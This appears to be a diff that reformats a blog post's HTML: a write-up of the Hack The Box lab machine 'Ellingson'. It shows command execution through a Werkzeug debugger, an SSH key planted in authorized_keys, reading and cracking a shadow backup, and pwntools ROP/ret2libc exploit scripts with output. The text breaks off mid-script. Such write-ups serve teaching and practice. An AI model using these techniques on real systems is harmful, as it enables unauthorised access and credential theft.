@@ -1,161 +1,117 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password&#39;s cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &#34;Analysing the Buffer Overflow&#34; section." />
-<meta name="keywords" content="security, boot2root, HTB, buffer overflow, ROP, ret2libc, linux">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Ellingson"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password&#39;s cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &#34;Analysing the Buffer Overflow&#34; section."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2019/10/htb-ellingson.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2019-10-21 11:25:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="buffer overflow"/>
-  <meta property="article:tag" content="ROP"/>
-  <meta property="article:tag" content="ret2libc"/>
-  <meta property="article:tag" content="linux"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Ellingson</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password's cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &quot;Analysing the Buffer Overflow&quot; section." name="description"/>
+<meta content="security, boot2root, HTB, buffer overflow, ROP, ret2libc, linux" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Ellingson" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password's cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &quot;Analysing the Buffer Overflow&quot; section." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2019/10/htb-ellingson.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2019-10-21 11:25:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="buffer overflow" property="article:tag"/>
+<meta content="ROP" property="article:tag"/>
+<meta content="ret2libc" property="article:tag"/>
+<meta content="linux" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Ellingson</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-ellingson">HTB: Ellingson</h1>
-    <p>
+<header>
+<h1 id="htb-ellingson">HTB: Ellingson</h1>
+<p>
       Posted on 21 Oct 2019 in <a href="../../category/security.html">security</a>
 
-        &#8226; 10 min read
+        • 10 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2019.10/ellingson_card.png" alt="Ellingson card" width="262"></p>
+</header>
+<div>
+<p><img alt="Ellingson card" class="align-left" src="/media/2019.10/ellingson_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/189">Ellingson</a>
 This box is classified as a hard machine. The user is not too hard to get as it
@@ -164,8 +120,6 @@ require the exploitation of a ROP buffer overflow.</p>
 <p><em>Note: if you just want to play with the buffer overflow, the binary is
  available on this site, just go to the
  <a href="https://maggick.fr/2019/10/htb-ellingson.html#analysing-the-buffer-overflow">"Analysing the Buffer Overflow" section</a></em>.</p>
-
-
 <h1>Recon</h1>
 <p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
 <div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139
@@ -180,29 +134,27 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds
 </code></pre></div>
-
 <h1>Web</h1>
 <p>The website is a standard corporate website (we can appreciate the dynamic rendering).</p>
-<p><img alt="Ellingson web page" src="/media/2019.10/ellingson_1.png"></p>
+<p><img alt="Ellingson web page" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/ellingson_1.png"/></p>
 <p>When browsing the articles, we notice that there is an ID at the end of the URL.
 If we put a non standard value like <code>2-1</code> or put an ID greater than expected we
 generate an error and a stacktrace. This debugger integrate a python
 interpretor:</p>
-<p><img alt="Werkzeug debugger" src="/media/2019.10/ellingson_3.png"></p>
+<p><img alt="Werkzeug debugger" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/ellingson_3.png"/></p>
 <h1>User</h1>
 <p>From there we can input python's commands and using the <code>OS</code> module we can
 execute command on the system. In order to get a shell we can simply upload our
 SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
-<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; import os; os.popen(&#39;whoami&#39;).read()
-&#39;hal\n&#39;
-&gt;&gt;&gt; import os; os.system(&#39;mkdir ~/.ssh/&#39;)
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; import os; os.popen('whoami').read()
+'hal\n'
+&gt;&gt;&gt; import os; os.system('mkdir ~/.ssh/')
 256
-&gt;&gt;&gt; import os; os.system(&#39;echo \&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6A/eqoQWIz14pbJ4L3Tsf+GzWv/O8Ym81ICPKpmyEl9cr3DyqCETUijFpMl6LYsdgc97EEdR6d2Xa2mpGMyDHRJSQGJJf2KehUBi6EqrkyEnPfMWNso50UtvzLwOUuxXTYmQ8iTGk3V5PbM0NHG7UQsABELrDL11NNKlV3XkuHE/yTuJQ0f80/ZDQFC7BzIfsl5iE3RmE+kRxTOyxniGwFW1bxYVW1Iqfw7isNVSyn0lkRgkSQjb2fKtFPdGughBm2j3O0+aPrRQyC7iytabc/Y8R248ziAVxqP/Nq8CEFAGXXoX8LS9WSIUfvMwqWevjbUxIKivOfGP9G8Tb994KaQFPUH13oku6GtoymAcaKjuscAHiD7q+1RJqOLg1qV7HVOzMFe46NdmGrK1dGqydfkTVjgwWJk0Swe/wJM8bIYIt6rG8/1kKDgBh86XeP4HDtj+fQo0+07RVrnFXPdBliyKPWIV2sz+qO/JCyX73YgYupps1/lsLb+l4N1BaUnk=\&#39;&gt;&gt;~/.ssh/authorized_keys&#39;)
+&gt;&gt;&gt; import os; os.system('echo \'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6A/eqoQWIz14pbJ4L3Tsf+GzWv/O8Ym81ICPKpmyEl9cr3DyqCETUijFpMl6LYsdgc97EEdR6d2Xa2mpGMyDHRJSQGJJf2KehUBi6EqrkyEnPfMWNso50UtvzLwOUuxXTYmQ8iTGk3V5PbM0NHG7UQsABELrDL11NNKlV3XkuHE/yTuJQ0f80/ZDQFC7BzIfsl5iE3RmE+kRxTOyxniGwFW1bxYVW1Iqfw7isNVSyn0lkRgkSQjb2fKtFPdGughBm2j3O0+aPrRQyC7iytabc/Y8R248ziAVxqP/Nq8CEFAGXXoX8LS9WSIUfvMwqWevjbUxIKivOfGP9G8Tb994KaQFPUH13oku6GtoymAcaKjuscAHiD7q+1RJqOLg1qV7HVOzMFe46NdmGrK1dGqydfkTVjgwWJk0Swe/wJM8bIYIt6rG8/1kKDgBh86XeP4HDtj+fQo0+07RVrnFXPdBliyKPWIV2sz+qO/JCyX73YgYupps1/lsLb+l4N1BaUnk=\'&gt;&gt;~/.ssh/authorized_keys')
 0
-&gt;&gt;&gt; import os; os.system(&#39;chmod 644 ~/.ssh/authorized_keys&#39;)
+&gt;&gt;&gt; import os; os.system('chmod 644 ~/.ssh/authorized_keys')
 0
 </code></pre></div>
-
 <p>As our SSH public key is in hal's <code>authorzied_key</code> we can connect as hal using
 SSH and starting to enumerate. The user flag is not in the hal's home folder:</p>
 <div class="highlight"><pre><span></span><code>sh 10.10.10.139 -lhal
@@ -211,7 +163,6 @@ hal
 hal@ellingson:~$ ls /home/
 duke  hal  margo  theplague
 </code></pre></div>
-
 <p>We enumerate the box and find an interesting non standard SUID binary:</p>
 <div class="highlight"><pre><span></span><code>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
 /usr/bin/newgrp
@@ -238,19 +189,16 @@ duke  hal  margo  theplague
 /bin/mount
 /bin/fusermount
 </code></pre></div>
-
 <p>Nevertheless we do not have the permission to execute it:</p>
 <div class="highlight"><pre><span></span><code>hal@ellingson:~$ ls -al /usr/bin/garbage
 -rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage
 hal@ellingson:~$ /usr/bin/garbage
 User is not authorized to access this application. This attempt has been logged.
 </code></pre></div>
-
 <p>We need another way. We see that we are in the group <code>adm</code> (in addition to our user group):</p>
 <div class="highlight"><pre><span></span><code>hal@ellingson:~$ id
 uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
 </code></pre></div>
-
 <p><strong>I struggled for a long time here before someone on the official discord told
 me that after a few hours
 the file permissions are changed and the file does not belong to <code>adm</code> group
@@ -285,7 +233,6 @@ anymore. I had to reset the box to find this file.</strong></p>
 /snap/core/6818/var/log/fsck/checkroot
 /snap/core/6818/var/spool/rsyslog
 </code></pre></div>
-
 <p>We cat the shadow.bak file and get some password hashes:</p>
 <div class="highlight"><pre><span></span><code>hal@ellingson:~$ cat /var/backups/shadow.bak
 root:*:17737:0:99999:7:::
@@ -322,7 +269,6 @@ hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92B
 margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
 duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
 </code></pre></div>
-
 <p>Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
 use <code>john</code> with the rockyou dictionary.</p>
 <div class="highlight"><pre><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt
@@ -330,7 +276,6 @@ john --show hash
 theplague:password123:17964:0:99999:7:::
 margo:iamgod$08:17964:0:99999:7:::
 </code></pre></div>
-
 <p>The first password was changed, as mention in the third article:</p>
 <blockquote>
 <p>We have recently detected suspicious activity on the network. Please make
@@ -341,14 +286,13 @@ the most common passwords are. Love, Secret, Sex and God -The Plague</p>
 <p>Nevertheless, we can connect as <code>margo</code> using SSH and the cracked password. And we
 retrieved the user flag:</p>
 <div class="highlight"><pre><span></span><code>ssh 10.10.10.139 -lmargo
-margo@10.10.10.139&#39;s password:
+margo@10.10.10.139's password:
 Last login: Wed Oct  2 12:25:47 2019 from 10.10.15.42
 margo@ellingson:~$ ls
 user.txt
 margo@ellingson:~$ cat user.txt
 d0ff9e&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Root</h1>
 <h2>Finding the SUID binary</h2>
 <p>Let's get back to the SUID binary:</p>
@@ -363,7 +307,6 @@ d0ff9e&lt;redacted&gt;
 /usr/bin/traceroute6.iputils
 /usr/bin/chfn
 </code></pre></div>
-
 <p>We run the binary, it ask for a password user input. If we put a wrong password
 we get an access denied. If we put a "long" password we get a segfault. This
 look like a buffer overflow:</p>
@@ -377,11 +320,9 @@ Enter access password: qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 access denied.
 Segmentation fault (core dumped)
 </code></pre></div>
-
 <p>Let's copy the binary on our machine:</p>
 <div class="highlight"><pre><span></span><code>scp margo@10.10.10.139:/usr/bin/garbage ./
 </code></pre></div>
-
 <p>We check the flags of the binary:</p>
 <div class="highlight"><pre><span></span><code>root@kalili:~# gdb ./garbage
 &lt;snip&gt;
@@ -392,24 +333,21 @@ NX        : ENABLED
 PIE       : disabled
 RELRO     : Partial
 </code></pre></div>
-
 <p>The No-Execute bit is set. Therefore we need to use a ret2lib.</p>
 <p>The ASLR is activated on the server:</p>
 <div class="highlight"><pre><span></span><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
 2
 </code></pre></div>
-
 <p>As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
 to do a ROP:</p>
 <div class="highlight"><pre><span></span><code>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./
 </code></pre></div>
-
 <h2>Analysing the Buffer Overflow</h2>
 <p><a href="/media/2019.10/ellingson_garbage"><em>The binary is avalible here</em></a></p>
 <p>We load the binary in gdb <a href="https://github.com/longld/peda">peda</a> and search for
 the size of the buffer.</p>
-<div class="highlight"><pre><span></span><code>gdb-peda$ r &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)
-Starting program: /root/garbage &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)
+<div class="highlight"><pre><span></span><code>gdb-peda$ r &lt; &lt;(python -c 'print "A"*133+"B"+"C"+"D"+"E"+"F"+"G"+"H"+"J"')
+Starting program: /root/garbage &lt; &lt;(python -c 'print "A"*133+"B"+"C"+"D"+"E"+"F"+"G"+"H"+"J"')
 Enter access password:
 access denied.
 
@@ -419,14 +357,14 @@ RAX: 0x0
 RBX: 0x0
 RCX: 0x7f1a0b24ead4 (&lt;__GI___libc_write+20&gt;:    cmp    rax,0xfffffffffffff000)
 RDX: 0x7f1a0b31f580 --&gt; 0x0
-RSI: 0x12a0ba0 (&quot;access denied.\nssword: \n\220\v*\001&quot;)
+RSI: 0x12a0ba0 ("access denied.\nssword: \n\220\v*\001")
 RDI: 0x0
-RBP: 0x4443424141414141 (&#39;AAAAABCD&#39;)
+RBP: 0x4443424141414141 ('AAAAABCD')
 RSP: 0x7ffedbba9290 --&gt; 0x7ffedbba9380 --&gt; 0x1
-RIP: 0x4a48474645 (&#39;EFGHJ&#39;)
+RIP: 0x4a48474645 ('EFGHJ')
 R8 : 0xf
 R9 : 0x7f1a0b31d848 --&gt; 0x7f1a0b31d760 --&gt; 0xfbad2a84
-R10: 0x4005a5 --&gt; 0x7475700073747570 (&#39;puts&#39;)
+R10: 0x4005a5 --&gt; 0x7475700073747570 ('puts')
 R11: 0x246
 R12: 0x401170 (&lt;_start&gt;:    xor    ebp,ebp)
 R13: 0x7ffedbba9380 --&gt; 0x1
@@ -435,18 +373,17 @@ R15: 0x0
 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction
 overflow)
 </code></pre></div>
-
 <p>The buffer size is 136 (133+3). We could also use the peda's functions
 <code>pattern_create</code> and <code>pattern_offset</code> to find it. Then we can start to write our exploitation
 script using <a href="http://pwntools.com">pwntools</a>:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">"DEBUG"</span><span class="p">)</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>
 
@@ -457,7 +394,6 @@ script using <a href="http://pwntools.com">pwntools</a>:</p>
 
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p>We want to get the dynamic address of <code>LIBC</code> in order to be able to call a
 specific function (let's say <code>/bin/sh</code>). For that we need:</p>
 <ul>
@@ -476,23 +412,23 @@ root@kalili:~# ropper --file ./garbage --search 'pop rdi'
 <p>two informations about the <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT</a> <code>puts</code> callsinto <code>LIBC</code>.  For that we can grep the <code>objdump</code> output:</p>
 <p>:::text
 objdump -D garbage | grep puts
-0000000000401050 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;">&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;</a>:
+0000000000401050 <a href="mailto:puts@plt">puts@plt</a>:
 401050: ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 &lt;puts@GLIBC _2.2.5&gt;</p>
 </li>
 </ul>
 <p>We add this addresses to our exploit and output the <code>puts</code> address in <code>LIBC</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">"DEBUG"</span><span class="p">)</span>
 
 <span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
 <span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span>
 
@@ -502,39 +438,37 @@ objdump -D garbage | grep puts
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 
 <span class="c1"># Leaked address printed in a readable format</span>
-<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'Leaked puts@GLIBC: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
 </code></pre></div>
-
 <p>Here is the output of it (for sanity I commented the debugging option):</p>
 <div class="highlight"><pre><span></span><code># python exploitP.py
-[+] Starting local process &#39;./garbage&#39;: pid 1407
+[+] Starting local process './garbage': pid 1407
 Enter access password:
 
 access denied.
 
 [+] Leaked puts@GLIBC: @ T�Z\x7f\x00\x00
-[*] Stopped process &#39;./garbage&#39; (pid 1407)
+[*] Stopped process './garbage' (pid 1407)
 
 # python exploitP.py
-[+] Starting local process &#39;./garbage&#39;: pid 1411
+[+] Starting local process './garbage': pid 1411
 Enter access password:
 
 access denied.
 
 [+] Leaked puts@GLIBC: @pYBs\x7f\x00\x00
-[*] Stopped process &#39;./garbage&#39; (pid 1411)
+[*] Stopped process './garbage' (pid 1411)
 
 # python exploitP.py
-[+] Starting local process &#39;./garbage&#39;: pid 1415
+[+] Starting local process './garbage': pid 1415
 Enter access password:
 
 access denied.
 
 [+] Leaked puts@GLIBC: @0X\x0en\x7f\x00\x00
-[*] Stopped process &#39;./garbage&#39; (pid 1415)
+[*] Stopped process './garbage' (pid 1415)
 </code></pre></div>
-
 <p>We got the leaked address of the <code>puts</code> call in LIBC.
 As the ASLR is on, multiple runs give us different addresses for the <code>puts</code> call
 in LIBC. But our process logically stop. If we rerun it the address will be
@@ -544,21 +478,20 @@ different. Therefore we need to recall our main. We get the address using
   401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
 0000000000401619 &lt;main&gt;:
 </code></pre></div>
-
 <p>And we add it to our script:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">)</span>
 
